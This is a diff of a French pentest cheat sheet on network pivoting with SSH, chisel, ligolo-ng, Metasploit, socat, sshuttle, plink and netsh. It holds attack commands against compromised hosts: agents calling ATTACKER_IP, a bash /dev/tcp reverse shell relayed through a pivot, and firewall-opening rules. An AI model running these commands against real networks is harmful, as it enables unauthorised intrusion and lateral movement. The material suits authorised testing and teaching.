@@ -1,12 +1,10 @@
-# 🔀 Network Pivoting - Guide Complet
+# Pivoting — Technique
 
-Guide exhaustif pour le pivoting réseau et le tunneling lors d'un pentest.
+> Utiliser une machine compromise comme relais pour atteindre des réseaux normalement inaccessibles depuis l'extérieur.
 
 ---
 
-## 📖 Concepts de Base
-
-### Qu'est-ce que le Pivoting ?
+## Présentation
 
 Le **pivoting** consiste à utiliser une machine compromise comme relais pour atteindre des réseaux normalement inaccessibles.
 
@@ -21,17 +19,38 @@ Le **pivoting** consiste à utiliser une machine compromise comme relais pour at
 Local Port Forward    → Accéder à un port distant via tunnel local
 Remote Port Forward   → Exposer un port local vers l'extérieur
 Dynamic Port Forward  → Proxy SOCKS (toutes destinations)
-VPN Tunneling        → Tunnel niveau réseau complet
+VPN Tunneling         → Tunnel niveau réseau complet
 ```
 
----
+## Détection / Identification
 
-## 1️⃣ SSH Tunneling
+Sur une machine fraîchement compromise, vérifier si elle peut servir de pivot :
 
-### Local Port Forwarding
+```bash
+# Linux — interfaces réseau, routes, ARP
+ip a
+ip route
+arp -a
+cat /etc/resolv.conf                 # DNS interne = indice de domaine AD
+cat /etc/hosts
 
-**Accéder à un service distant via la machine pivot.**
+# Windows — équivalents
+ipconfig /all
+route print
+arp -a
+```
 
+**Indices d'un hôte pivot exploitable :**
+- Plusieurs interfaces réseau / plusieurs sous-réseaux dans la table de routage (machine dual/multi-homed)
+- Table ARP contenant des IP hors du sous-réseau déjà connu
+- Résolveur DNS interne, suffixe de domaine AD
+- Règles de pare-feu locales permissives entre segments (`iptables -L`, `netsh advfirewall firewall show rule name=all`)
+
+## Exploitation
+
+### SSH Tunneling
+
+**Local Port Forwarding** — accéder à un service distant via la machine pivot.
 ```bash
 # Syntaxe: ssh -L [local_port]:[target_host]:[target_port] user@pivot
 
@@ -49,10 +68,7 @@ mysql -h 127.0.0.1 -P 3306 -u dbuser -p
 ssh -L 8080:web.internal:80 -L 3306:db.internal:3306 user@pivot.com
 ```
 
-### Remote Port Forwarding
-
-**Exposer un service de l'attaquant vers le réseau interne.**
-
+**Remote Port Forwarding** — exposer un service de l'attaquant vers le réseau interne.
 ```bash
 # Syntaxe: ssh -R [remote_port]:[local_host]:[local_port] user@pivot
 
@@ -71,30 +87,24 @@ ssh -R 4444:127.0.0.1:4444 user@pivot.com
 # → Redirigé vers attacker:4444
 ```
 
-### Dynamic Port Forwarding (SOCKS Proxy)
-
-**Créer un proxy SOCKS pour accéder à tout le réseau.**
-
+**Dynamic Port Forwarding (SOCKS Proxy)** — créer un proxy SOCKS pour accéder à tout le réseau.
 ```bash
 # Créer le proxy SOCKS
 ssh -D 1080 user@pivot.com
 
 # Utiliser avec proxychains
 echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
-proxychains nmap -sT -Pn 192.168.1.0/24
+proxychains curl http://192.168.1.10/
 
 # Ou configurer dans le navigateur
 # Proxy SOCKS5: 127.0.0.1:1080
 
-# Utiliser avec curl
+# Utiliser avec curl directement (SOCKS natif)
 curl --socks5 127.0.0.1:1080 http://192.168.1.10/
-
-# Utiliser avec nmap (via proxychains)
-proxychains nmap -sT -Pn -p 80,443,22 192.168.1.10
 ```
+> Scan dédié à travers ce proxy : voir `nmap.md`, section "Scan à travers un pivot".
 
-### SSH Options utiles
-
+**Options utiles :**
 ```bash
 # En arrière-plan
 ssh -f -N -D 1080 user@pivot.com
@@ -112,36 +122,26 @@ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@pivot.com
 ssh -f -N -C -D 1080 -o ServerAliveInterval=60 user@pivot.com
 ```
 
----
+### Chisel
 
-## 2️⃣ Chisel
-
-### Installation
-
+**Installation**
 ```bash
-# Télécharger les binaires
-# https://github.com/jpillora/chisel/releases
+# Télécharger les binaires : https://github.com/jpillora/chisel/releases
 
 # Linux
 wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
 gunzip chisel_*.gz && chmod +x chisel
 
-# Windows
-# chisel_windows_amd64.exe
+# Windows : chisel_windows_amd64.exe
 ```
 
-### Serveur (Attaquant)
-
+**Serveur (Attaquant)**
 ```bash
-# Démarrer le serveur
 ./chisel server -p 8000 --reverse
-
-# Avec authentification
-./chisel server -p 8000 --reverse --auth user:password
+./chisel server -p 8000 --reverse --auth user:password   # avec authentification
 ```
 
-### Client (Pivot)
-
+**Client (Pivot)**
 ```bash
 # Reverse SOCKS proxy
 ./chisel client ATTACKER_IP:8000 R:socks
@@ -153,27 +153,23 @@ gunzip chisel_*.gz && chmod +x chisel
 ./chisel client ATTACKER_IP:8000 R:socks R:3306:db.internal:3306
 ```
 
-### Utilisation
-
+**Utilisation**
 ```bash
 # Le proxy SOCKS est sur 127.0.0.1:1080 (par défaut) sur le serveur
-proxychains nmap -sT -Pn 192.168.1.0/24
+proxychains curl http://192.168.1.10/
 
 # Ou spécifier le port
 ./chisel server -p 8000 --reverse --socks5
 ./chisel client ATTACKER_IP:8000 R:9050:socks
 # SOCKS sur 127.0.0.1:9050
 ```
+> Scan dédié à travers ce proxy : voir `nmap.md`, section "Scan à travers un pivot".
 
----
+### Ligolo-ng
 
-## 3️⃣ Ligolo-ng
-
-### Installation
-
+**Installation**
 ```bash
-# Télécharger proxy (attaquant) et agent (pivot)
-# https://github.com/nicocha30/ligolo-ng/releases
+# Télécharger proxy (attaquant) et agent (pivot) : https://github.com/nicocha30/ligolo-ng/releases
 
 # Attaquant
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_proxy_0.6.1_linux_amd64.tar.gz
@@ -182,8 +178,7 @@ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_p
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.1/ligolo-ng_agent_0.6.1_linux_amd64.tar.gz
 ```
 
-### Configuration (Attaquant)
-
+**Configuration (Attaquant)**
 ```bash
 # Créer l'interface TUN
 sudo ip tuntap add user $(whoami) mode tun ligolo
@@ -196,18 +191,15 @@ sudo ip link set ligolo up
 sudo ip route add 192.168.1.0/24 dev ligolo
 ```
 
-### Agent (Pivot)
-
+**Agent (Pivot)**
 ```bash
-# Connecter l'agent
 ./agent -connect ATTACKER_IP:11601 -ignore-cert
 
 # Windows
 agent.exe -connect ATTACKER_IP:11601 -ignore-cert
 ```
 
-### Interface Ligolo
-
+**Interface Ligolo**
 ```bash
 # Dans le proxy
 ligolo-ng » session
@@ -217,60 +209,43 @@ ligolo-ng » start
 # Le tunnel est actif
 
 # Maintenant, accéder directement au réseau interne
-nmap -sT -Pn 192.168.1.0/24  # Sans proxychains!
 ssh user@192.168.1.10
 ```
+> Scan dédié à travers ce tunnel (sans proxychains, tous types de scan) : voir `nmap.md`, section "Scan à travers un pivot".
 
----
+### Metasploit Pivoting
 
-## 4️⃣ Metasploit Pivoting
-
-### Ajouter une route
-
+**Ajouter une route**
 ```bash
 # Après avoir obtenu une session meterpreter
 meterpreter > run autoroute -s 192.168.1.0/24
 
 # Ou manuellement
 msf > route add 192.168.1.0 255.255.255.0 1  # 1 = session ID
-
-# Vérifier les routes
 msf > route print
 ```
 
-### SOCKS Proxy
-
+**SOCKS Proxy**
 ```bash
-# Démarrer le module SOCKS
 msf > use auxiliary/server/socks_proxy
 msf > set SRVPORT 1080
 msf > set VERSION 5
 msf > run -j
-
-# Utiliser avec proxychains
-proxychains nmap -sT -Pn 192.168.1.10
 ```
+> Scan dédié à travers ce proxy : voir `nmap.md`, section "Scan à travers un pivot".
 
-### Port Forward
-
+**Port Forward**
 ```bash
-# Local port forward
 meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.10
 # Accéder à 127.0.0.1:8080 → 192.168.1.10:80
 
-# Lister les forwards
 meterpreter > portfwd list
-
-# Supprimer
 meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.10
 ```
 
----
+### Socat
 
-## 5️⃣ Socat
-
-### Port Forwarding basique
-
+**Port Forwarding basique**
 ```bash
 # Sur le pivot
 socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
@@ -279,8 +254,7 @@ socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
 curl http://pivot:8080  # → 192.168.1.10:80
 ```
 
-### Reverse Shell via Pivot
-
+**Reverse Shell via Pivot**
 ```bash
 # Attaquant
 nc -lvnp 4444
@@ -292,10 +266,8 @@ socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444
 bash -c 'bash -i >& /dev/tcp/PIVOT_IP/4444 0>&1'
 ```
 
-### Tunneling avancé
-
+**Tunneling avancé (SSL)**
 ```bash
-# Créer un tunnel SSL
 # Serveur
 socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:22
 
@@ -304,19 +276,13 @@ socat TCP-LISTEN:2222,fork OPENSSL:server:443
 ssh -p 2222 localhost
 ```
 
----
-
-## 6️⃣ SSHuttle
-
-### Installation
+### SSHuttle
 
 ```bash
 pip install sshuttle
 # ou
 apt install sshuttle
 ```
-
-### Utilisation
 
 ```bash
 # Tunnel tout le trafic vers un sous-réseau
@@ -335,29 +301,13 @@ sshuttle -r user@pivot.com 192.168.1.0/24 -x 192.168.1.1
 sshuttle --dns -r user@pivot.com 192.168.1.0/24
 ```
 
-### Avantages
+**Avantages** : pas besoin de proxy ou de proxychains, TCP transparent, support DNS, simple à utiliser.
 
-```
-✅ Pas besoin de proxy ou proxychains
-✅ TCP transparent
-✅ Support DNS
-✅ Simple à utiliser
-```
-
----
-
-## 7️⃣ Plink (Windows)
-
-### Téléchargement
+### Plink (Windows)
 
 ```powershell
-# Depuis PuTTY
-# https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
-```
+# Depuis PuTTY : https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
 
-### Utilisation
-
-```powershell
 # Dynamic forward (SOCKS)
 plink.exe -D 1080 user@pivot.com
 
@@ -371,11 +321,7 @@ plink.exe -R 4444:127.0.0.1:4444 user@pivot.com
 echo y | plink.exe -ssh -l user -pw password -D 1080 pivot.com
 ```
 
----
-
-## 8️⃣ Netsh (Windows Natif)
-
-### Port Forwarding
+### Netsh (Windows natif)
 
 ```powershell
 # Ajouter un forward
@@ -386,31 +332,21 @@ netsh interface portproxy show all
 
 # Supprimer
 netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+netsh interface portproxy reset          # Supprimer tout
 
-# Supprimer tout
-netsh interface portproxy reset
-```
-
-### Firewall
-
-```powershell
-# Autoriser le port
+# Firewall — autoriser le port
 netsh advfirewall firewall add rule name="Pivot 8080" dir=in action=allow protocol=tcp localport=8080
 ```
 
----
+### Double Pivoting
 
-## 9️⃣ Double Pivoting
-
-### Scénario
-
+**Scénario**
 ```
 [Attacker] → [Pivot1 (DMZ)] → [Pivot2 (Internal)] → [Target (Secured)]
    Kali         10.0.0.5          192.168.1.10         172.16.0.5
 ```
 
-### Avec SSH
-
+**Avec SSH**
 ```bash
 # Premier tunnel (Attacker → Pivot1)
 ssh -D 1080 user@pivot1.com
@@ -422,8 +358,7 @@ ssh -D 1081 -o ProxyCommand="nc -x 127.0.0.1:1080 %h %p" user@192.168.1.10
 ssh -J user@pivot1.com user@pivot2.internal
 ```
 
-### Avec Chisel
-
+**Avec Chisel**
 ```bash
 # Attaquant: serveur
 ./chisel server -p 8000 --reverse
@@ -435,14 +370,12 @@ ssh -J user@pivot1.com user@pivot2.internal
 # Pivot2: client vers Pivot1
 ./chisel client PIVOT1:9000 R:1081:socks
 
-# Chaîne de proxys
-# proxychains.conf:
+# Chaîne de proxys (proxychains.conf)
 # socks5 127.0.0.1 1080
 # socks5 127.0.0.1 1081
 ```
 
-### Avec Metasploit
-
+**Avec Metasploit**
 ```bash
 # Session 1: Pivot1
 meterpreter > run autoroute -s 192.168.1.0/24
@@ -454,19 +387,13 @@ msf > exploit
 
 # Session 2: Pivot2
 meterpreter > run autoroute -s 172.16.0.0/24
-
 # Maintenant accès à 172.16.0.0/24 via Session 2
 ```
 
----
+### Proxychains
 
-## 🔟 Proxychains
-
-### Configuration
-
+**Configuration** (`/etc/proxychains.conf` ou `/etc/proxychains4.conf`)
 ```bash
-# /etc/proxychains.conf ou /etc/proxychains4.conf
-
 # Mode (strict, dynamic, random)
 dynamic_chain  # Saute les proxys morts
 
@@ -477,45 +404,54 @@ socks4 127.0.0.1 1081
 http 127.0.0.1 8080
 ```
 
-### Utilisation
-
+**Utilisation**
 ```bash
-# Commande simple
 proxychains curl http://192.168.1.10
-
-# Nmap (TCP connect uniquement)
-proxychains nmap -sT -Pn -p 80,443,22 192.168.1.10
-
-# Metasploit
 proxychains msfconsole
-
-# SSH
 proxychains ssh user@192.168.1.10
-
-# Tout programme
 proxychains firefox
 proxychains python3 exploit.py
 ```
+> Scan dédié à travers proxychains : voir `nmap.md`, section "Scan à travers un pivot".
 
-### Limitations
-
+**Limitations** :
 ```
-❌ Pas de UDP (DNS, SNMP)
-❌ Pas d'ICMP (ping)
-❌ Nmap limité à -sT (connect scan)
+Pas de UDP (DNS, SNMP)
+Pas d'ICMP (ping)
+Nmap limité à -sT (connect scan)
 
-✅ Solution DNS: utiliser --dns avec sshuttle
-✅ Ou configurer un serveur DNS local
+Solution DNS : utiliser --dns avec sshuttle, ou un serveur DNS local
 ```
 
----
+## Post-exploitation
 
-## 📚 Ressources
+Une fois le tunnel établi, poursuivre l'énumération et l'exploitation du réseau interne comme si la machine était sur place : scan de ports (voir `nmap.md`), énumération SMB/LDAP/AD, mouvement latéral vers de nouveaux hôtes pivots pour étendre l'accès (double/triple pivoting).
 
-- **Chisel** : https://github.com/jpillora/chisel
-- **Ligolo-ng** : https://github.com/nicocha30/ligolo-ng
-- **SSHuttle** : https://github.com/sshuttle/sshuttle
-- **HackTricks Pivoting** : https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
+## Vulnérabilités / Misconfigurations classiques
 
----
+| Faiblesse | Impact |
+|---|---|
+| Hôte dual/multi-homed sans segmentation stricte | Point de pivot direct vers un réseau plus sensible |
+| Pare-feu interne permissif entre segments | Tunneling et pivoting facilités une fois un hôte compromis |
+| Pas de monitoring des connexions sortantes inhabituelles | Tunnels SSH/chisel/ligolo non détectés |
+| Comptes de service avec accès à plusieurs segments réseau | Pivot applicatif via un compte compromis |
 
+## Outils de référence
+
+| Outil | Usage |
+|---|---|
+| `ssh` (-L/-R/-D) | Tunneling natif, SOCKS, port forward |
+| `chisel` | Tunneling HTTP, contourne les pare-feu sortants stricts |
+| `ligolo-ng` | Tunnel niveau réseau (TUN), scans complets sans proxychains |
+| `socat` | Relais/port forward générique, y compris SSL |
+| `sshuttle` | VPN-like par-dessus SSH, sans proxychains |
+| `proxychains` | Router n'importe quel outil à travers un proxy SOCKS/HTTP |
+| Metasploit (`autoroute`, `socks_proxy`, `portfwd`) | Pivoting depuis une session meterpreter |
+| `plink` / `netsh` | Pivoting depuis un hôte Windows |
+
+## Ressources
+
+- Chisel : https://github.com/jpillora/chisel
+- Ligolo-ng : https://github.com/nicocha30/ligolo-ng
+- SSHuttle : https://github.com/sshuttle/sshuttle
+- HackTricks Pivoting : https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
